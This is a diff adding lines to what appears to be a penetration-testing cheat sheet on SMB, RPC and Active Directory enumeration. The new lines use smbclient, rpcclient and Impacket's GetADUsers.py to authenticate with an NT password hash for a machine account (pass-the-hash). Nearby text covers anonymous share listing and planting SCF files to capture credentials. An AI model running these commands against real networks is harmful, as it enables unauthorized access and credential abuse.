@@ -129,6 +129,7 @@ Smbclient
   smbclient -N -L //10.10.10.97 (List all SMB Shares as anonymous)
   smbclient -N //10.10.10.97/share (View Share contents)
   smbclient -U username //10.10.10.97/share (<recurse on> to list everything)
+  smbclient //10.9.15.10/sysvol -U 'corewebdl$%4182816cd42bdb6d20f7fb89703f5c48' --pw-nt-hash
   
 SMB Mount Share
   mount -t cifs -o user=<username> //10.10.10.97/share /mnt
@@ -172,6 +173,10 @@ Evil-WinRm
 Anonymous RPC
   rpcclient -U "" -N 10.10.10.161
   rpcclient -U "username%password" -c "enumdomusers;quit" 10.10.10.161
+  rpcclient -U 'corewebdl$%4182816cd42bdb6d20f7fb89703f5c48' --pw-nt-hash 10.9.15.10
+  
+Impacket Tools
+  ./GetADUsers.py core.cyber.local/'corewebdl$' -dc-ip 10.9.15.10 -hashes '0:4182816cd42bdb6d20f7fb89703f5c48'
   
 SCF (Shell Command Files)
   If you can write to a share you can create a SCF file which points an ICONfile to a local share to grab creds with responder.
